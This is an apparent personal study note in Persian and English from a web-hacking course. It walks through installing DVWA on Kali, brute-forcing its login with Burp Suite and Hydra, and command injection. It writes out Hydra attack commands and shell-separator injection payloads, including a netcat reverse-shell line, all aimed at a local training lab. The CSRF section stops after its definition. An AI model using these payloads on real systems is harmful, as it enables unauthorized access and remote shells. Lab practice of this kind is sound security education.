---
Episode: E64 to E68
Date: 2024-07-23
Is Finished?: true
Practice Primary: true
Practice Secondary: 
Time: 35:00
tags:
  - CyberSecurity
  - hacking
Category: Cyber Security
banner: 
Home: "[[Table of Content - Hacking & Security]]"
Pervious Episode: "[[E62 to E63 - (Host & Subdomain Enumeration)]]"
Next Episode: "[[E69 to E72 - (Web Hacking - Part 2)]]"
---
-------
## E64 to E68 - (Web Hacking - Part 1)
- [Install DVWA on Kali Linux - E64](#Install%20DVWA%20on%20Kali%20Linux%20-%20E64)
	- [Whats DVWA(Damn Vulnerable Web Application)?](#Whats%20DVWA(Damn%20Vulnerable%20Web%20Application)?)
	- [Install & Run DVWA in Kali](#Install%20&%20Run%20DVWA%20in%20Kali)
	- [Configure DVWA](#Configure%20DVWA)
- [Brute Forcing Web App Passwords Using `Burpsuite` & `Hydra` - E65](#Brute%20Forcing%20Web%20App%20Passwords%20Using%20%60Burpsuite%60%20&%20%60Hydra%60%20-%20E65)
	- [Concepts & Definition's](#Concepts%20&%20Definition's)
		- [Lesson Description](#Lesson%20Description)
		- [What is Brute Force Technique?](#What%20is%20Brute%20Force%20Technique?)
		- [What is Hydra?](#What%20is%20Hydra?)
			- [Hydra Description](#Hydra%20Description)
			- [Hydra Usage](#Hydra%20Usage)
	- [Practical Demo](#Practical%20Demo)
		- [DVWA Brute Forcing - Low Difficulty](#DVWA%20Brute%20Forcing%20-%20Low%20Difficulty)
			- [Instruction](#Instruction)
			- [Brute Forcing with Burpsuite](#Brute%20Forcing%20with%20Burpsuite)
			- [Brute Forcing with Hydra](#Brute%20Forcing%20with%20Hydra)
		- [DVWA Brute Forcing - Medium Difficulty](#DVWA%20Brute%20Forcing%20-%20Medium%20Difficulty)
			- [Instruction](#Instruction)
			- [Brute Forcing with Burpsuite](#Brute%20Forcing%20with%20Burpsuite)
			- [Brute Forcing with Hydra](#Brute%20Forcing%20with%20Hydra)
		- [DVWA Brute Forcing - High Difficulty](#DVWA%20Brute%20Forcing%20-%20High%20Difficulty)
			- [Instruction](#Instruction)
			- [Brute Forcing with Burpsuite](#Brute%20Forcing%20with%20Burpsuite)
- [Command Injection(Execution) on Linux - E66](#Command%20Injection(Execution)%20on%20Linux%20-%20E66)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is Command Injection?](#What%20is%20Command%20Injection?)
		- [Execute Command in Web Server Methods](#Execute%20Command%20in%20Web%20Server%20Methods)
	- [Practical Demo](#Practical%20Demo)
		- [DVWA Command Injection - Low Difficulty](#DVWA%20Command%20Injection%20-%20Low%20Difficulty)
		- [DVWA Command Injection - Medium Difficulty](#DVWA%20Command%20Injection%20-%20Medium%20Difficulty)
		- [DVWA Command Injection - High Difficulty](#DVWA%20Command%20Injection%20-%20High%20Difficulty)
- [CSRF Basics & Exploitation - E67](#CSRF%20Basics%20&%20Exploitation%20-%20E67)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is CSRF(Cross Site Request Forgery)?](#What%20is%20CSRF(Cross%20Site%20Request%20Forgery)?)
		- [DVWA CSRF Logic & Instruction](#DVWA%20CSRF%20Logic%20&%20Instruction)
	- [Practical Demo](#Practical%20Demo)
		- [DVWA CSRF - Low Difficulty](#DVWA%20CSRF%20-%20Low%20Difficulty)
- [File Inclusion Vulnerabilities - E68](#File%20Inclusion%20Vulnerabilities%20-%20E68)
	- [Definition & Instruction](#Definition%20&%20Instruction)
		- [What is File Inclusion Vulnerability?](#What%20is%20File%20Inclusion%20Vulnerability?)
		- [DVWA File Inclusion Instruction](#DVWA%20File%20Inclusion%20Instruction)
	- [Practical Demo](#Practical%20Demo)
------
### Install DVWA on Kali Linux - E64
#### Whats DVWA(Damn Vulnerable Web Application)? 
- یک Web Application یا همان Website است که بصورت کاملا آسیب پذیر طراحی شده است و اغلب به عنوان یک ابزار آموزشی استفاده میشود. این وبسایت Security Vulnerability های شایع و پرکاربرد را دارد و میتوانیم برای تمرین این نوع آسیب پذیری ها از آن استفاده کنیم.
- در کل برای یادگیری امنیت وب اپلیکیشن ها، تست ابزار های امنیتی و آسیب پذیری ها در وب اپلیکیشن ها از DVWA استفاده میشود.
- *وب اپلیکیشن DVWA آسیب پذیری های زیر را در خود جای داده است >>*
	1. SQL Injection
	2. File Inclusion
	3. Cross-Site Request Forgery(CSRF)
	4. Insecure Direct Object Reference
- *اسلاید*:
	- ![[Pasted image 20240721211303.png]]
#### Install & Run DVWA in Kali 
وب اپلیکیشن DVWA در ریپوزیتوری های Kali وجود دارد بنابراین برای نصب DVWA بر روی کالی کافیست >>
```sh
sudo apt install DVWA
dvwa-start #Start DVWA
dvwa-stop #Stop DVWA
```
	![[Pasted image 20240721211553.png]]
برای استفاده و اجرای DVWA هم از کامند `dvwa-start` استفاده میکنیم:
	![[Pasted image 20240721211722.png]]
#### Configure DVWA
0. Once `dvwa-start` you should enter root password and then DNWA Login page will be appear
	1. ![[Pasted image 20240721212804.png]]
1. *Default Login Credential*
	1. Username: `admin`
	2. Password: `password`
2. *Now Setup page will be appear, Scroll Down and =>*
	1. `Create/Reset Database`
		1. ![[Pasted image 20240721213302.png]]
	2. After Create/Reset Database Setup Successfully done.
		1. ![[Pasted image 20240721213417.png]]
	3. Login again to DVWA 
	4. *Slide*:
		1. ![[Pasted image 20240721212338.png]]
3. Now we can access to DVWA. 
4. *Set Security Level*
	1. `Left sidebar => DVWA Security => Select level => Submit`
		1. ![[Pasted image 20240721213751.png]]
	2. Start from Low Security Level
5. *Attack Types in DVWA*
	1. We can Perform many type of web application attack in DVWA, Just need select Suitable attack in Left Sidebar
		1. ![[Pasted image 20240721214008.png]]
6. After practicing is done, you can stop DVWA by run following command `dvwa-stop`
	1. ![[Pasted image 20240721212505.png]]
### Brute Forcing Web App Passwords Using `Burpsuite` & `Hydra` - E65
#### Concepts & Definition's
##### Lesson Description
در این جلسه میخواهیم ببینیم Brute Forcing چیست و همچنینی میخواهیم حمله ای را با متد Brute Force پیاده سازی کنیم. اینکار را میخواهیم در آزمایشگاه DVWA و بوسیله ابزار های Burpsuite و Hydra انجام دهیم.
##### What is Brute Force Technique?
- از این تکنیک در علوم کامپیوتری برای برای امتحان مقدار وسیعی از داده های ممکن در یک فیلد ورودی مانند فیلد های پسورد، یوزرنیم و یا کلید ها استفاده میشود، و این امر تا زمانی ادامه پیدا میکند تا عبارت صحیح برای آن فیلد یافت شود.
- در واقع در این روش تمام مقادیر که فکر میکنیم ممکن است درست باشد را بوسیله تعریف Wordlist در حمله در جای مناسب خود امتحان میکنیم تا مقدار صحیح یافت شود.
- در این جلسه میخواهیم با استفاده از  Burp Suite و Hydra حمله Brute Force را به لاگین فرم درون DVWA برای یافتن پسورد آن فیلد انجام دهیم.
	![[Pasted image 20240722164011.png]]
##### What is Hydra?
###### Hydra Description 
- ابزار Hydra یک ابزار Network Login Cracking در محیط CLI است که برای پیاده سازی حملات Brute Force بر روی انواع پروتکل های شبکه مانند HTTP, SSH, Telnet, FTP, HTTPS, ... استفاده میشود.
- ابزار Hydra میتواند حملات Bruteforce را با سرعت بسیار بیشتری نسبت به Burpsuite Community Edition انجام دهد، اما نسخه Burpsuite Pro میتواند با استفاده از چندین Thread سرعت بیشتری داشته باشد.
- *برای کار و پیاده سازی حملات با Hydra باید از کامند استفاده کنیم که این کامند باید فرمت بندی شود >>*
	- باید URL را بصورت کامل بنویسیم. برای بدست آوردن URL کامل میتوانیم به `Inspect Page` صفحه برویم.
	- برای مشخص کردن پارامتری که باید Brute Force بر روی آن انجام شود، باید پارامتر میان کارکتر `^^` مانند `^USER^`یا `^PASSWORD^` باشد.
	- همچنین برای بدست آوردن Cookie های یک وبسایت باید به `Inspect => storage tab` در برویم که در این حمله نیازمند مقدار کوکی `PHPSESSID` هستیم.
	- همچنین برای انجام این حمله ها، باید Message Login Failure را نیز داشته باشیم که میتوانیم آنرا در ابزار با `F-` معرفی کنیم.
- *اسلاید*:
	- ![[Pasted image 20240722170721.png]]
###### Hydra Usage
- اگر از سوئیچ `l-` استفاده کنیم میتوانیم یوزری که میخواهیم پسورد آن یافت شود را وارد کنیم در حالیکه اگر میخواهیم برای یافتن یوزر هم Brute Force انجام شود، باید از `L-` و یک Wordlist استفاده کنیم.
- همین امر در وارد کردن پسورد هم حاکم است بدین معنا که اگر میخواهیم پسورد ثابت تعریف کنیم از `p-` استفاده میکنیم و برای یافتن پسورد هم Brute Force انجام شود، باید از `P-` و یک Wordlist استفاده کنیم.
- همچنین اگر میخواهیم به صفحه HTTP که Cookie بنام `PHPSESSID` دارد حمله را انجام دهیم، باید مقدار این Cookie را کپی کنیم و در آخر URL در جلوی فلگ `H:` به نحو زیر وارد کنیم:
	- `URL:H=Cookie\:PHPSESSID=PHPSESSIDVALUE`
- همچنین برای وارد کردن Failure Message هم باید پس از وارد کردن Cookie های لازم آنرا در جلوی `F:` بنویسیم:
	- `COOKIES:F=LOGIN FAILURE MESSAGE`
- در کامند زیر به URL DVWA صفحه Brute Force حمله را انجام میدهیم و هدف حمله زیر بدست آوردن `username` , `password` فرم لاگین صفحه http://127.0.0.1:42001/vulnerabilities/brute میباشد:
	![[Pasted image 20240722171511.png]]
```sh
#-----Usage-----#
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q;security=low:F=Username and/or password incorrect'

#-----Flags-----#
-l => Specify the Username
-L => Specify Wordlist for finding username using in Bruteforce
-p => Specify the password
-P => Define Wordlist for finding password using in Bruteforce
-V => Verbose mode
-I => Ignore any error
```
	![[Pasted image 20240722171651.png]]
#### Practical Demo
##### DVWA Brute Forcing - Low Difficulty
###### Instruction
0. *Pre-Requires*
	1. Set DVWA Security Level on `Low`
	2. Fire Up Burpsuite, Set Proxy on browser via Foxy Proxy => `HTTP 127.0.0.1:8080`
		1. ![[Pasted image 20240722164355.png]]
	3. Now goto Brute Force section in DVWA
1. *Brute Forcing with Burpsuite*
	1. حال فرم لاگین را با یوز admin و پسوردی دلخواه پر میکنیم و بر روی Login کلیک میکنیم تا HTTP Request توسط Burp کپچر شود.
	2. سپس به Burpsuite بر میگردیم، بر روی درخواست کپچر شده کلیک راست میکنیم و سپس آنرا به `Intruder Module` میفرستیم.
		1. ![[Pasted image 20240722164749.png]]
	3. *در ماژول `Intruder` و در تب `Position`:* تمام Target ها را Clear میکنیم و سپس فقط پارامتر `password` را `Add Target` میکنیم:
		1. ![[Pasted image 20240722164929.png]]
	4. *در ماژول `Intruder` و در تب `Payload`:* ابتدا `Payload Type: Simple List` میگذاریم و سپس باید Wordlist مربوط را با کلیک بر روی `Load` انتخاب کنیم. در اینجا از `john.lst` استفاده میکنیم:
		1. ![[Pasted image 20240722165207.png]]
	5. حال میتوانیم `Start Attack` را شروع کنیم تا Burp حمله Brute Force را برای یافتن پسورد انجام دهد.
	6. برای یافتن مقدار Match شده، باید به `Length` مربوط به `Request/Response` ها دقت کنیم. در واقع اگر Length یک درخواست با سایر درخواست ها متفاوت بود به معنای Match بودن پسورد است. 
		1. ![[Pasted image 20240722165736.png]]
	7. در تصویر زیر Length تمام درخواست ها 4499 است و یک درخواست است که Length متفاوتی با اندازه 4537 دارد که معلوم میشود این مقدار یافت شده است.
		1. ![[Pasted image 20240722165755.png]]
2. *Brute Forcing with Hydra*
	1. برای پیاده سازی این حمله ابتدا باید `Full URL` کامل صفحه را بدست بیاوریم.
		1. ![[Pasted image 20240724224029.png]]
	2. سپس باید مقدار `Cookies` های PHPSESSID و Security Level را کپی میکنیم. مقدار Cookie ها را میتوانیم در فیلد Cookie در تب Network مشاهده کنیم:
		1. ![[Pasted image 20240724223956.png]]
	3. همچنین `Failure Message` لاگین را هم مشاهده میکنیم.
		1. ![[Pasted image 20240724224056.png]]
	4. هدف حمله زیر بدست آوردن `username` , `password` فرم لاگین صفحه http://127.0.0.1:42001/vulnerabilities/brute میباشد.
```sh
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get://127.0.0.1:42001/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login':H=Cookie\:security=low;PHPSESSID=qdun94975v7l9mitk5p72f3oi6:F=Username and/or password incorrect

```
	![[Pasted image 20240722171651.png]]
###### Brute Forcing with Burpsuite
0. *Pre-Requires & Obtain Pre-Needed Information*
	1. Set Security Level On Low 
	2. Goto Brute Force Section
	3. Login with any credential to get `Failure Login Message` and copy it
		1. ![[Pasted image 20240722172225.png]]
	4. Open `Inspect` in Brute Force Page, goto `Network tab` and Copy `Complete URL`
		1. ![[Pasted image 20240722172501.png]]
1. *Set Proxy & Capture Request `Proxy Module`*
	1. Open Burpsuite in Temporary Project
	2. goto Proxy tab and set `Intercept On`
		1. ![[Pasted image 20240722172900.png]]
	3. goto Firefox and open Foxy Proxy, then add below proxy on Firefox and then connect to it>>
		1. `HTTP 127.0.0.1:8080`
			1. ![[Pasted image 20240722172817.png]]
	4. go back DVWA Brute Force page, Login with `admin/sasas` credentials to Capture Request in `Burp Proxy Tab`.
		1. ![[Pasted image 20240722173108.png]]
	5. Now Right-Click on Request and Click on `Send to Intruder` (`CTRL + I`)
		1. ![[Pasted image 20240722173212.png]]
2. *Perform Brute Forcing `Intruder Module`*
	1. حال که درخواست به ماژول حمله Intruder ارسال شده است، ابتدا باید Position حمله و سپس باید Payload حمله را مشخص کنیم.
	2. `Intruder Module => Position tab `
		1. Attack Mode: Sniper
			1. بدلیل اینکه میخواهیم پارامتر ها را یک به یک مورد حمله قرار دهیم.
		2. First `Clear$` All Targets
			1. ![[Pasted image 20240722173735.png]]
		3. Select `Password Value` and then Click on `Add$`
			1. ![[Pasted image 20240722173831.png]]
	3. `Intruder Module => Payload tab `
		1. Payload Type: Simple List
		2. Click `Load` and select `john.lst`
			1. ![[Pasted image 20240722174003.png]]
	4. Now Click on `Start attack`
		1. ![[Pasted image 20240722174043.png]]
3. *Attack Result*
	1. حال حمله شروع شده است و Burp تمام کلمه های Wordlist را در پارامتر password جایگذاری میکند تا مقدار صحیح را پیدا کند.
	2. برای یافتن مقدار صحیح، هر درخواستی که Length آن با بقیه متفاوت بود به معنای این است که پارامتر ما بدرستی Match شده است.
	3. بنابراین نتایج را بر اساس ستون Length به اصطلاح Sort میکنیم تا مقدار متفاوت را مشاهده کنیم. در اینجا درخواست های Failure مقدار Length 4499 دارند و یک درخواست درست ما هم Length 4537 دارد که از این قسمت متوجه درست بودن آن میشویم:
		1. ![[Pasted image 20240722174445.png]]
	4. برای اطمینان حاصل کردن از صحت یافته شدن پسورد، با انتخاب Request که Match شده است به تب Response میرویم تا بتوانیم پیام لاگین موفق را مشاهده کنیم:
		1. ![[Pasted image 20240722174616.png]]
	5. پس از یافتن پسورد هم میتوانیم حمله را `Pause` کنیم.
###### Brute Forcing with Hydra
0. *Pre-Requires & Obtain Pre-Needed Information*
	1. `DVWA => Brute Force Page` Login with Wrong Credential and Copy `Failure Message`
	2. `Brute Force page => Inspect => Network tab ` Copy Full URL
		1. ![[Pasted image 20240722174916.png]]
	3. `Brute Force page => Inspect => Storage tab => Cookies ` Copy `PHPSESSID` value
		1. ![[Pasted image 20240722175012.png]]
1. *Perform Brute Force with Hydra*
	1. به محض اجرای کامند حمله برای یافتن پسورد آغاز میشود و در صورت یافت شدن پسورد میتوان آنرا در صفحه مشاهده کرد.
		1. ![[Pasted image 20240722180342.png]]
```sh
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q;security=low:F=Username and/or password incorrect'
```
	![[Pasted image 20240722180133.png]]

##### DVWA Brute Forcing - Medium Difficulty
###### Instruction
در سطح متوسط، در Source صفحه میتوانیم مشاهده کنیم که در آخر کد های صفحه `()sleep` وجود دارد که این موضوع باعث میشود حمله زمانبری را نسبت به روش سطح آسان داشته باشیم.
- **Brute Forcing with `Burpsuite`**
0. *Pre-Requires*
	1. ابتدا سطح امنیتی DVWA ر ا به medium تغییر میدهیم.
	2. حال Burpsuite را روشن میکنیم، سپس به ماژول Proxy میرویم و Intercept On میکنیم.
	3. در مرورگر هم در Foxy Proxy پراکسی را بر روی `HTTP 127.0.0.1:8080` قرار میدهیم.
	4. سپس به صفحه Brute Force باز میگردیم و یک لاگین با یوزر admin و هر پسوردی انجام میدهیم تا درخواست در Burp کپچر شود.
1. *Capture Request & Brute Forcing in Burpsuite*
	1. درخواست کپچر شده را در Burp ماژول Proxy میتوانیم مشاهده کنیم. در این درخواست فقط مقدار `Cookie` بنام `Security` به `Medium` تغییر کرده است.
		1. ![[Pasted image 20240722185244.png]]
	2. حال کافیست درخواست را به Intruder بفرستیم و حمله را مانند روش Low Difficulty پیاده سازی کنیم.
	3. `Sniper` Attack on `user` parameter with `john.lst` payload
- **Brute Forcing with `Hydra`**
برای انجام حمله با Hydra هم در روش متوسط مانند روش آسان عمل میکنیم، تنها تفاوتی که وجود دارد این است که حمله با سرعت بسیار کمتر نسبت به روش سطح آسان صورت میگیرد:
	![[Pasted image 20240722185720.png]]
در واقع در این حمله، از فلگ `I-` برای رفع خطاهایی که ممکن است رخ بدهد، همچنین از فلگ `V-` برای فعال کردن حالت Verbose Mode استفاده میشود.
```sh
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q;security=medium:F=Username and/or password incorrect' -V -I
#-----Flags-----#
-V Verbose mode
-I Ignore any error
```
	![[Pasted image 20240722185742.png]]
###### Brute Forcing with Burpsuite
0. *Pre-Requires*
	1. Fire on Burpsuite and Intercept on, also set Proxy on firefox
	2. Set Security level on Medium
	3. goto `Brute Force` page and click on `View source`
		1. در کد های برنامه میتوانیم مشاهده کنیم که Login Input ها بصورت معمولی انجام میشود و فقط یک تاخیر دو ثانیه ای `sleep(2)` در آخر کدهای صفحه وجود دارد.
			1. ![[Pasted image 20240722190449.png]]
	4. بنابراین میتوانیم از روش حمله معمولی استفاده کنیم اما در هر امتحان دو ثانیه زمان مصرف میشود.
1. *Capture Request in `Proxy Module`*
	1. با یک یوزر admin و یک پسورد لاگین میکنیم تا `HTTP Request` در Burp کپچر شود. سپس بر روی درخواست کلیک راست میکنیم و آنرا به `Intruder` میفرستیم.
		1. ![[Pasted image 20240722190913.png]]
2. *Set Attack Options in `Intruder Module`*
	1. `Intruder => Positions`
		1. *Attack Type:* Sniper mode
		2. `Clear$` all targets
		3. Select `password value` and `Add$` it to target.
			1. ![[Pasted image 20240722191223.png]]
	2. `Intruder => Payloads`
		1. *Payload type:* Simple List
		2. Click on `Load` and select `john.lst` or `rockyou.txt`
			1. ![[Pasted image 20240722191426.png]]
		3. `Start Attack`
			1. ![[Pasted image 20240722191459.png]]
	3. Now Burp start cracking password in a Brute Force Attack but Attack Speed is to low
	4. Sort all requests base on `Length` Column, then Open Different length requests which matched password currently 
		1. ![[Pasted image 20240722191607.png]]
	5. goto `Response tab` to see Welcome Login message, Or Open Response in Browser to ensure Cracking is Ok
		1. ![[Pasted image 20240722191830.png]]
3. Cracking done
###### Brute Forcing with Hydra
0. Obtaining Pre-Needed Information
	1. `DVWA => Brute Force page => Inspect => Networking tab` Copy Full URL
	2. `DVWA => Brute Force page => Inspect => Networking tab => Click on URL => Request Header Section => Cookies Field` Copy Cookies Values
		1. ![[Pasted image 20240724225649.png]]
	3. `DVWA => Brute Force Page` Login with wrong credential and then Copy Login Failure Message
1. Initialize Bruteforce Attack to find Password of `admin` user with Hydra
	1. با اجرای کامند ابزار شروع به یافتن پسورد یوزر admin میکند و پس از یافت آنرا در صفحه نمایش میدهد. `password` 
```sh
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q;security=medium:F=Username and/or password incorrect' -V -I
```
	![[Pasted image 20240722192625.png]]
	![[Pasted image 20240722192644.png]]
##### DVWA Brute Forcing - High Difficulty
###### Instruction
در لول دشوار، در هر درخواست یک توکن `CSRF` ساخته میشود و به هر درخواست تعلق میگیرد. بنابراین پیاده سازی Brute Force بسیار دشوار میباشد و در واقع نمیتوانیم این حمله را بوسیله Hydra انجام دهیم.
هنگامیکه با Hydra این حمله را در لول دشوار انجام میدهیم، ابزار پیام `False Positive, Fails Uncompleted` میدهد و نمیتواند پسورد یوزر را پیدا کند.
	![[Pasted image 20240722201133.png]]
- **Brute Force with Burp Suite instruction**
	1. یک لاگین با یوزر admin و پسورد اشتباه انجام میدهیم و سپس درخواست را در Burp کپچر میکنیم.
	2. سپس درخواست کپچر شده را به Intruder میفرستیم. برای حمله در این لول، باید تغییراتی را نسبت به حالت متوسط و آسان اضافه کنیم. 
	3. ابتدا در `Intruder => Position` تنظیمات زیر را انجام میدهیم *>>*
		1. هر دو فیلد `Password` و `user_token` را در *target* ها انتخاب میکنیم.
		2. سپس نوع حمله *Attack Type* را به `Pitchfork` تغییر میدهیم
	4. سپس در  `Payload` هایی که در حمله استفاده میکنیم باید به نحو زیر تنظیم شود *>>*
		1. سپس در `Payload Set:1` همان تارگت اول یعنی فیلد Password، از `Simple List` و `john.lst` استفاده میکنیم.
		2. سپس در  `Payload Set:2` همان تارگت دوم یعنی فیلد Token، از `Payload Type: Recursive Grep` استفاده میکنیم.
			1. ![[Pasted image 20240722202034.png]]
	5. در آخر هم به تب `Options` میرویم تا تنظیمات حمله را اعمال کنیم >>
		1. ابتدا یک `Grep Extract` جدید `Add` میکنیم.
		2. سپس `Token` را انتخاب میکنیم تا `Extract` شود.
			1. ![[Pasted image 20240722202905.png]]
		3. در قسمت `Redirection` هم `Follow Redirection: Always` قرار میدهیم.
			1. ![[Pasted image 20240722203204.png]]
		4. در آخر هم به `Resource Pool` میرویم و `Create new Resource Pool` را با تعداد هسته `Maximum Thread: 1` ایجاد و تنظیم میکنیم.
			1. ![[Pasted image 20240722203420.png]]
	6. حال میتوانیم `Start Attack` را انجام دهیم. نتیجه حمله را Sort کردن Length و یافتن Length متفاوت انجام میدهیم.
		1. ![[Pasted image 20240722203556.png]]
- **Brute Force with Hydra instruction**
	- هنگامیکه حمله را با Hydra انجام میدهیم با پیام False Positive روبرو میشویم که بدین معناست که Hydra نتوانسته پسورد را بدرستی پیدا کند.
```sh
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:'H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q;security=high:F=Username and/or password incorrect -V -I
```
	![[Pasted image 20240722204105.png]]
	![[Pasted image 20240722204208.png]]
###### Brute Forcing with Burpsuite
0. *Pre-Requires*
	1. Set Security level on High
	2. *goto `Brute Force` page and click on `View source`*
		1. در کدهای صفحه میتوان مشاهده کرد که تکه کدی برای عملیات `Anti-CSRF` وجود دارد که توکن CSRF را برای جلوگیری از حملات Brute Force ایجاد میکند و میتواند یک لایه امنیتی به حساب بیاید.
			1. ![[Pasted image 20240722204356.png]]
		2. پس از آن تکه کد هم، کد های Login Input قرار دارد.
	3. Fire on Burpsuite and `Intercept on`, also set `Proxy` on `firefox`. 
1. *Capture Request `Proxy Module`*
	1. `Login` with *admin* and any password in DVWA Brute Force Login Form, and `capture request in Burpsuite`.
	2. in `Proxy Module` Right-Click on Request and `Send to Intruder` 
		1. ![[Pasted image 20240722204756.png]]
2. *Perform Brute Force `Intruder Module`*
	1. `Intruder => Position tab =>`
		1. *Attack Type:* Pitchfork
			1. ![[Pasted image 20240722204918.png]]
		2. `Clear` all targets
		3. Select `password value` & Click `Add$` to define *First Target*
		4. Select `user_token value` & Click `Add$` to define *Second target*
			1. ![[Pasted image 20240722205147.png]]
	2. `Intruder => Payload tab =>`
		1. `Payload set: 1` for `$password$`
			1. *Payload type:* Simple List
			2. `Load` Select `john.lst` as Wordlist
				1. ![[Pasted image 20240722205458.png]]
		2. `Payload set: 2` for `$user_token$`
			1. *Payload type:* Recursive grep
	3. `Intruder => Options tab =>`
		1. `Grep - Extract => Add => `
			1. Click on `Fetch Response`
				1. ![[Pasted image 20240722205906.png]]
			2. Find `<input type='hidden' name='user_token'>` and select `tag value`
				1. ![[Pasted image 20240722210049.png]]
			3. با انتخاب تگ حاوی token، فیلد *Start offset* بصورت خودکار پر میشود. همچنین باید *End at fixed length* را انتخاب کنیم و تا مقدار *32* بصورت خودکار در جلوی آن وارد شود.
				1. ![[Pasted image 20240722210301.png]]
		2. `Grep - Match =>`
			1. First `Clear` all values in list.
				1. ![[Pasted image 20240722210416.png]]
			2. Then `Add`  => `incorrect` (*Optional*)
				1. ![[Pasted image 20240722210538.png]]
		3. `Redirections =>`
			1. Set on `Always` (*Required*)
				1. ![[Pasted image 20240722210621.png]]
	4. `Intruder => Resource Pool tab =>`
		1. Select `Create new resource pool`
			1. ![[Pasted image 20240722210940.png]]
		2. Checked `Maximum concurrent requests` and enter `1` for field value.
			1. ![[Pasted image 20240722210842.png]]
	5. Now click on `Start Attack` 
		1. ![[Pasted image 20240722211034.png]]
3. *Attack Results*
	1. After some minutes, Sort results Based on `Length` Column
		1. ![[Pasted image 20240722211157.png]]
	2. Click on Request with different Length. 
		1. ![[Pasted image 20240722211345.png]]
	3. Right-Click on different length request and select `Open response in Browser` to see Welcome Login Message for `admin` user with `Password: password` and Right CSRF Token
		1. ![[Pasted image 20240725000852.png]]
4. Attack finished successfully
	1. ![[Pasted image 20240725000936.png]]
### Command Injection(Execution) on Linux - E66
#### Definition & Instruction
##### What is Command Injection?
- در برخی از وبسایت ها بدلیل باگ هایی که وجود دارد، میتوان کامندهای لینوکسی را به فیلد های ورودی تزریق کنیم و در واقع کامند را در سرور تارگت اجرا کنیم.
- در آزمایشگاه DVWA میتوانیم این فرآیند را تست کنیم، برای اینکار به ماژول `DVWA => Command Injection` میرویم. 
- در این صفحه فیلدی وجود دارد که باید آیپی در آن وارد کنیم تا از پینگ گرفته شود. 
- در نتیجه میتوانیم با استفاده از کاراکتر های خاص مانند `| , & , && , ; ,` میتوانیم علاوه بر کامند `ping` کامند دلواهی را نیز تزریق کنیم.
- *اسلاید*:
	- ![[Pasted image 20240722212154.png]]
##### Execute Command in Web Server Methods
برای اجرای کامند در یک فیلد متنی در وبسایت میتوانیم از روش های متفاوتی استفاده کنیم. در واقع باید از متصل کننده های کامند در bash که شامل کاراکتر های `&&` , `&` , `|` , `;` , .... میشود استفاده کنیم.
- مثلا میتوانیم از کامند ها به شکل زیر استفاده کنیم >>
```sh
127.0.0.1 && ls
127.0.0.1 & ls
127.0.0.1 ; 127.0.0.1
127.0.0.1 | ls
```
- همچنین در روش پیشرفته میتوانیم با تزریق کدهای Reverse Shell، دسترسی Shell به ماشین تارگت بگیریم. البته در این روش باید Listener Netcat نیز از قبل فعال شده باشد.
```sh
sudo nc -lvnp 9001
127.0.0.1 && nc -c sh 127.0.0.1 9001
```
- *اسلاید*:
	- ![[Pasted image 20240722213014.png]]
#### Practical Demo
##### DVWA Command Injection - Low Difficulty
0. *Pre-Requires*
	1. Set security level on `low`
	2. goto `DVWA => Command Injection`
1. *Now in `Enter an ip address field` Enter below value*
	1. `127.0.0.1 && ls`
		1. ![[Pasted image 20240722213918.png]]
	2. now `ls` command executed on server.
		1. ![[Pasted image 20240722213214.png]]
2. *Use Reverse shell to execute command*
	1. Open Terminal in Kali and Start netcat Listener
		1. `nc -lnvp 9001`
	2. No go back to Command Injection page and Inject below command
		1. `127.0.0.1 && nc -c sh 127.0.0.1 9001`
			1. ![[Pasted image 20240722214235.png]]
	3. After run command we can access DVWA Shell in Kali Terminal
		1. ![[Pasted image 20240722214312.png]]
##### DVWA Command Injection - Medium Difficulty
در این مرحله، استفاده از یکسری کاراکتر ها مانند `&&, ;` ممنوع شده است. 
	![[Pasted image 20240722214401.png]]
اما همچنان با مشاهده کردن سورس میتوان مشاهده کرد که استفاده از `|` میسر است. بنابراین کافیست در فیلد `Enter an ip address field` مقدار زیر را وارد کنیم >>
	![[Pasted image 20240722213508.png]]
1. `127.0.0.1 | ls`
	1. ![[Pasted image 20240722214418.png]]
##### DVWA Command Injection - High Difficulty
- در این مرحله استفاده از `Typo |` و `Space` و بسیاری از کاراکتر های دیگر هم ممنوع شده است.
	- ![[Pasted image 20240722214507.png]]
- اما در کد های صفحه، در خطی که استفاده از `|` ممنوع شده است، میتوان مشاهده کرد که یک اشتباه تایپی وجود دارد و در واقع یک کارکتر Space در کنار Typo وارد شده است => ` |`
	- ![[Pasted image 20240722214751.png]]
- در واقع یک کاراکتر Space اضافه وارد شده است و به همین دلیل استفاده از ` |` ممنوع شده و میتوان از `ls|` بدون فاصله استفاده کرد. بنابراین میتوان در این مرحله هم با وارد کردن `ls|` بدون فاصله نتیجه کامند را مشاهده کنیم.
- `|ls`
	- ![[Pasted image 20240722214930.png]]
	- ![[Pasted image 20240722214952.png]]
### CSRF Basics & Exploitation - E67
#### Definition & Instruction
##### What is CSRF(Cross Site Request Forgery)?
- نوعی از حمله میباشد که در صورتی رخ میدهد که وبسایت، ایمیل و یا وبلاگی Malicious(مخرب و آلوده) باشد. 
- در این نوع حمله، Attacker با استفاده از Web Browser خود دستورات و اکشن های غیر مجازی را بر روی یک هاست Trust اعمال میکند.
- از حملات CSRF برای انتقال Funds ها(اطلاعات مالی)، تغییر اطلاعات اکانت و یا انجام سایر کار های مخرب در هاست تارگت استفاده میشود.
- *اسلاید*:
